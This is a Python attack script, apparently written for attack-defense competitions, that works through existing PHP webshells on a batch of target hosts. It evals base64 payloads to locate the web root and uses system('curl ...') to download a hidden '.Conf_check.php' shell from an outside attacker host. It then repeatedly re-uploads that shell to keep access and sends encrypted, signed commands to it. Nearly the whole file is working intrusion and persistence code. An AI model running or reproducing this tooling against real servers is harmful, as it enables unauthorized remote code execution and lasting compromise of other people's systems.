#!/usr/bin/python
# -*- coding: UTF-8 -*-
# made by 3s_NwGeek
# from multiprocessing.dummy import Pool as ThreadPool
import requests,re,random,time,base64
from gevent import monkey
from gevent.pool import Pool
from bs4 import BeautifulSoup
monkey.patch_all()
from urllib import unquote
from hashlib import md5
passwd = 'ts@hack'
#
#
# # 上传页面,http://TARGET_IP不变，改路径就可以了，后面函数会替换TARGET_IP为target
# webshell_path = "http://TARGET_IP/upload_file.php"#上传提交的地址
# raw_data = open('C:\Users\\3s_NwGeek\Desktop\\sqlpost.txt').read()#上传数据包

# 目标主机
# target = '127.0.0.1:80'
webshell_path='http://TARGET_IP/1.php'#一句话路径
webshell_psw='a'
local_ip='http://172.16.210.110/1.txt'#下载马源码的地址
#批量目标主机
targets=open("C:\Users\\3s_NwGeek\Desktop\\target.txt").read().splitlines()

bakup_webshell_url='''http://TARGET_IP/index.php
http://TARGET_IP/light.php'''.splitlines()


def main(target):
    # 上传功能
    while True:
        usual_get(target)
        webshell_url=upupup(target, webshell_path)#运行一次后可以注释这行加效率，不用每次循环上传一次
        #读取url  php -loadip 、reupload、get ?_、norespond、random get
        # print webshell_url
        if webshell_url:
            if 'http' not in webshell_url:
                time.sleep(3)
                # print "主循环一次"
                continue
            #upupup要返回上马地址
            # webshell_url='http://127.0.0.1:80/info.php'
            tar,res=maintain_webshell(webshell_url,target)
            if len(res)>0:
                random_get(target,res)
            else:
                # print len(res),res
                pass
        time.sleep(5)
        print target,"主循环一次"

def upupup(target, webshell_path):#上传
    try:
        # print "进入upupup()"

        reg = ".*/([^/]*\.php?)"
        webshell_path = webshell_path.replace('TARGET_IP', target)
        match_shell_name = re.search(reg, webshell_path)
        if match_shell_name:
            shell_name = match_shell_name.group(1)  # 1.php
            shell_path = ""
            try:
                data = {}
                #######
                data[webshell_psw] = '@eval(base64_decode($_POST[z0]));'
                data['z0'] = 'ZWNobyAnIS1fLSEtXy0hJy4kX1NFUlZFUlsnRE9DVU1FTlRfUk9PVCddLichLV8tIS1fLSEnOw=='
                shell_path = \
                re.findall(re.compile(r'\!-_-\!-_-\!.+\!-_-\!-_-\!'), requests.post(webshell_path, data,proxies={'http': 'http://127.0.0.1:8080'}).text.strip())[
                    0].replace('!-_-!-_-!', '')
                #######
                target_path = shell_path.split(shell_name)[0] + '/.Conf_check.php'  # 获取上传绝对路径文件地址
                # print target_path
                target_path_base64 = base64.b64encode(target_path)
                target_file_url = webshell_path.split(shell_name)[0] + '/.Conf_check.php'  # 上传url地址
                # print target_file_url
                data = {}
                data[webshell_psw] = ('system("curl %s -o %s");'%(local_ip,target_path))
                print data[webshell_psw],target

                requests.post(webshell_path, data,proxies={'http': 'http://127.0.0.1:8080'}).text.strip()
                if 'check_url' in requests.get(target_file_url + "?_",proxies={'http': 'http://127.0.0.1:8080'}).content:
                    # print "跳出upupup:check_url"

                    return target_file_url
                else:
                    pass
            except Exception as e:
                print target ,e
                # "跳出upupup:err"


        else:
            # print "跳出upupup():err"
            pass
    except Exception as e:
        # print "跳出upupup():err"
        pass

def maintain_webshell(webshell_url, target, Timeout=5):#检测函数，返回检测目标，检测结果
    # print "进入maintain_webshell()"
    head = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:62.0) Gecko/20100101 Firefox/62.0',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
            'Connection': 'close',
            'Upgrade-Insecure-Requests': '1',
            'Cache-Control': 'max-age=0'}
    try:
        r=requests.get(webshell_url + '?_', headers=head,timeout=5,proxies={'http': 'http://127.0.0.1:8080'})
        # print r.content
        # html=BeautifulSoup(r.content.decode('gb2312','ignore'),'lxml')#注意根据实际情况编码
        html = BeautifulSoup(r.content, 'lxml', from_encoding="utf8")  # 注意根据实际情况编码
        checks_arr = html.find_all(attrs={'id': 'check_url'})#获取url
        if len(checks_arr)<2:#爬取失败重传马
            print target,"%s 获取phpurl：%d 状态码 %d webshell失效，正在尝试重传webshell\n" % (webshell_url,len(checks_arr),r.status_code)
            time.sleep(0.5)
            webshell_url, check_res=maintain_webshell(upupup(target, webshell_path), target)#感觉有问题，导致res数量变化
            # usual_get(target)
        else:
            check_res = []
            for check_str in checks_arr:
                check_res.append(check_str.string)

        print "权限维持成功:",target,len(check_res),webshell_url
        # print "跳出maintain_webshell():find_allphp"
        return webshell_url, check_res
    except Exception as e:
        if 'timeout' in str(e):
            RCE_res=excmd(webshell_url, passwd, 'echo testRCE')
            if RCE_res:
                print target,'：执行命令成功，但感染超时，请使用轻便版--------->',RCE_res
                return webshell_url,bakup_webshell_url
            else:
                print target+'：执行命令失败，可能权限不足感染失败，或者php遍历函数被禁，or 主机连接失败'
        print target,'err from maintain_webshell',e
        # print "跳出maintain_webshell():err"
        return webshell_url,[]

def random_get(target,res):
    try:
        # print "进入random_get"
        buff=res
        while len(res)>1:
            ran_url=random.sample(buff,1)[0]
            ran_url, res = maintain_webshell(ran_url, target)
            if len(res)<2:#失效情况下
                random.shuffle(buff)
                for url in buff:
                    url, res = maintain_webshell(url, target)
                    if len(res)>2:
                        buff=res
                        break
                    print target,'该webshell失效，正在尝试缓存buff'
            elif len(res)>=2:#成功情况下
                buff=list(set(buff+res))
                # print buff
                print len(buff)
                time.sleep(3)
            else:
                print "random_get又给我出现什么bug了，res：",res,"buff:",buff


        usual_get(target)
        # print "跳出random_get()"# print '权限维持成功：', len(res),r, res
    except Exception as e:
        print '%s   "err from random_get"：上传webshell_url错误！:%s'%(target,e)
        pass

def usual_get(target):
    try:
        # print "进入usual_get()"
        base_url='http://'+target+'/.Conf_check.php'
        w_url,res=maintain_webshell(base_url,target)
        if len(res)>1:
            # print res
            random_get(target,res)
        # print "跳出usual_get()"
    except:
        pass
################以下为命令执行函数
def getSerTime(url):
    ser_time_format = '%a, %d %b %Y %H:%M:%S GMT'
    head = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:62.0) Gecko/20100101 Firefox/62.0',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
            'Connection': 'close',
            'Upgrade-Insecure-Requests': '1',
            'Cache-Control': 'max-age=0'}
    r = requests.get(url, allow_redirects=False,headers=head,proxies={'http': 'http://127.0.0.1:8080'})
    if r.headers['Date']:
        stimestrp = time.strptime(r.headers['Date'], ser_time_format)
        stime = time.mktime(stimestrp) + 60 * 60 * 8    # GMT + 8 时区
        timeskew = int(time.time()) - int(stime)
        return timeskew
    else:
        return None
# 加密
def encrypt(string, salt, encoding='utf-8'):
    estring = ''
    b64string = base64.b64encode(string.encode(encoding)).decode('utf-8')
    for n, char in enumerate(b64string):
        estring += chr(ord(char) ^ n % salt)
    return estring
# 解密
def decrypt(estring, salt, encoding='utf-8'):
    data=estring[::-1].replace('cAFAcABAAswTA2GE2c','i').replace(':kcehc_revres','=').encode('unicode_escape').decode("string_escape")
    string=unquote(base64.urlsafe_b64decode(data))
    # string=unicode(string, "gb2312").encode("utf8")#有中文乱码去掉这个注释
    return string
# 命令执行
def excmd(url, passwd, cmd, encoding='utf-8'):
    try:
        timeskew = getSerTime('/'.join(url.split('/')[:-1]))
        # 校对服务器时间，防止时间差造成API校验失败
        nowtime = int(time.time())
        if timeskew == None:
            print('检查服务器时间出错，请手动确认服务器时间！')
            # 手动获取服务器时间戳，并保存到servtime变量中，int类型
            # Linux下获取方法： date +%s
            # Windows的话，还是运行Python, time.time()吧，放弃治疗
            servtime = 1540891350
            nowtime = servtime
        else:
            nowtime -= timeskew
        # 开始发起请求
        passwd = md5(passwd.encode('utf-8')).hexdigest()
        salt = int(random.random() * 100)
        ecmd = encrypt(cmd, salt)
        sign_tmp = ecmd + passwd + str(nowtime) + str(salt)
        sign = md5(sign_tmp.encode('utf-8')).hexdigest()
        parameters = {
            'time': nowtime,
            'check': ecmd,
            'salt': salt,
            'sign': sign
        }
        head = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:62.0) Gecko/20100101 Firefox/62.0',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
                'Connection': 'close',
                'Upgrade-Insecure-Requests': '1',
                'Cache-Control': 'max-age=0'}
        r = requests.get(url, params=parameters, headers=head,proxies={'http': 'http://127.0.0.1:8080'},timeout=3)
        # r = requests.post(url, data=parameters, headers=head, proxies={'http': 'http://127.0.0.1:8080'}),
        if '0:' in r.text:print '执行成功：',
        res = decrypt(r.content.decode('utf-8').replace('0:',''), salt, encoding)
        return res
    except Exception as e:
        pass
        print(url,'参数配置错误，连接异常err:%s'%str(e))
        # traceback.print_exc()

if __name__ == '__main__':

    # main(target)
    pool = Pool(len(targets))#批量
    pool.map(main, targets)
